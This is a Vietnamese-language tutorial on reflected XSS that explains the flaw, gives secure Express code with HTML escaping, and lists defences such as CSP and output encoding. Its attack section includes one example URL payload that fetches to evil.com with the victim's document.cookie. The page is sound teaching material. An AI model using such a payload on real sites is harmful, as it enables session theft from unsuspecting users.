# Reflected XSS

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation) | **Phân loại**: XSS

## 🧱 Kiến thức Nền tảng
Tham số truy vấn URL (URL query parameters) là tập hợp dữ liệu được đính kèm ở cuối đường dẫn URL sau dấu hỏi chấm `?`, dưới dạng các cặp khóa-giá trị (ví dụ: `?query=iphone`). Các tham số này thường được trình duyệt gửi lên máy chủ để chỉ định các hành động động như tìm kiếm, lọc dữ liệu hoặc phân trang.

Khi máy chủ nhận được yêu cầu HTTP, nó sẽ xử lý dữ liệu và sử dụng cơ chế dựng HTML phía máy chủ (server-side HTML rendering) để tạo ra trang tài liệu HTML động hoàn chỉnh trước khi gửi về lại cho trình duyệt client hiển thị. Lỗ hổng Reflected XSS (XSS phản xạ) xuất hiện khi máy chủ lấy trực tiếp giá trị của các tham số truy vấn từ yêu cầu HTTP này và chèn thẳng vào nội dung phản hồi HTML mà không tiến hành làm sạch hoặc mã hóa ký tự đặc biệt (HTML entity encoding).

Nếu kẻ tấn công gửi cho nạn nhân một liên kết chứa mã kịch bản độc hại trong tham số truy vấn, máy chủ sẽ vô tình phản chiếu mã kịch bản đó vào trang HTML trả về. Trình duyệt của nạn nhân khi phân tích trang sẽ thực thi đoạn mã độc này vì coi đó là một phần hợp lệ của tài liệu được máy chủ cung cấp. Để phòng chống, mọi dữ liệu nhận từ tham số truy vấn khi dựng HTML phía máy chủ phải được mã hóa phù hợp theo ngữ cảnh (ví dụ: thay thế các ký tự nguy hiểm như `<`, `>`, `&`, `"`, `'` thành thực thể HTML tương ứng).

### Code ví dụ hoạt động bình thường (Secure Server-Side Rendering)
```javascript
const express = require('express');
const app = express();

// Helper function to escape HTML characters and prevent XSS injection
const escapeHtml = (unsafeString) => {
    if (typeof unsafeString !== 'string') {
        return '';
    }
    return unsafeString
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

// Express route handling search query parameters
app.get('/search', (req, res) => {
    // Retrieve parameter and ensure it is treated strictly as a string
    const rawQuery = typeof req.query.q === 'string' ? req.query.q : '';
    
    // Escape user input before interpolating it into server-side HTML rendering
    const safeQuery = escapeHtml(rawQuery);
    
    // Send response with safely encoded parameters
    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: <strong>${safeQuery}</strong></p>
            </body>
        </html>
    `);
});
```

## 🔍 Mô tả lỗ hổng
Reflected XSS (XSS phản xạ) xảy ra khi dữ liệu đầu vào từ yêu cầu HTTP của người dùng được phản chiếu ngay lập tức trong phản hồi HTML của máy chủ mà không được mã hóa hoặc lọc ký tự phù hợp. Kẻ tấn công có thể chèn các đoạn mã JavaScript độc hại vào tham số truy vấn (URL) và gửi liên kết cho nạn nhân. Khi nạn nhân click vào liên kết, trình duyệt của họ tải trang phản hồi từ máy chủ và thực thi mã độc.

## ⚔️ Cơ chế tấn công
Kẻ tấn công quan sát thấy một trang web hiển thị lại tham số tìm kiếm từ URL lên trang kết quả (ví dụ truy cập `http://site.com/search?q=banana` sẽ in ra dòng "Search results for: banana"). Chúng tạo một liên kết độc hại có dạng `http://site.com/search?q=<script>fetch('http://evil.com?c=' + document.cookie)</script>` và gửi cho nạn nhân qua email. Khi nạn nhân click, máy chủ của trang web nhận yêu cầu, chèn trực tiếp kịch bản script vào trang HTML trả về, khiến trình duyệt của nạn nhân chạy đoạn mã gửi cookie phiên làm việc của họ sang máy chủ của kẻ tấn công.

## 🛡️ Biện pháp phòng thủ
- **Tóm tắt**: Phòng chống Reflected XSS bằng cách mã hóa dữ liệu đầu ra dựa theo ngữ cảnh hiển thị, kiểm tra kiểu dữ liệu đầu vào nghiêm ngặt và triển khai chính sách Content Security Policy (CSP).
- **Các bước chi tiết**:
  - Thực hiện mã hóa đầu ra tương thích với ngữ cảnh (HTML body, thuộc tính HTML, kịch bản JavaScript, hoặc tham số URL) cho tất cả các dữ liệu do người dùng cung cấp trước khi trả về.
  - Xác thực và lọc sạch tất cả các tham số đầu vào bằng cơ chế danh sách trắng (allowlist).
  - Triển khai chính sách bảo mật nội dung (CSP) nghiêm ngặt để cấm thực thi các tập lệnh inline không rõ nguồn gốc và giới hạn nguồn script được phép tải.
  - Sử dụng các framework hiện đại (React, Angular, Vue) có tích hợp sẵn cơ chế mã hóa đầu ra an toàn theo mặc định.
  - Thiết lập tiêu đề phản hồi `X-Content-Type-Options: nosniff` để ngăn chặn các cuộc tấn công khai thác MIME-sniffing.

## 💻 Code Example
```javascript
const escapeHtml = (unsafeString) => {
    if (typeof unsafeString !== 'string') {
        return '';
    }
    return unsafeString
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

// Example handler rendering search results
app.get('/search', (req, res) => {
    const query = typeof req.query.q === 'string' ? req.query.q : '';
    const safeQuery = escapeHtml(query);
    res.send(`<h1>Search results for: ${safeQuery}</h1>`);
});
```

## 📚 Ghi chú kỹ thuật & Nguồn tham khảo
- **Trạng thái kiểm định**: FIXED
- **Ghi chú kỹ thuật**: Đã sửa một lỗi logic nghiêm trọng trong Express JS: khi người dùng truyền tham số dạng mảng/đối tượng (như `?q[]=val`), việc gọi trực tiếp `.replace` trên đối tượng đó sẽ gây crash tiến trình (TypeError). Đồng thời, việc chuyển đổi ép kiểu bằng `String(unsafeString)` trên các đối tượng null-prototype cũng ném ra lỗi. Mã nguồn đã được sửa bằng cách bổ sung kiểm tra nghiêm ngặt `typeof unsafeString === 'string'` và xử lý loại trừ dữ liệu không phải chuỗi thô.
- **Nguồn tham khảo**: OWASP XSS Cheat Sheet, PortSwigger, CWE-79
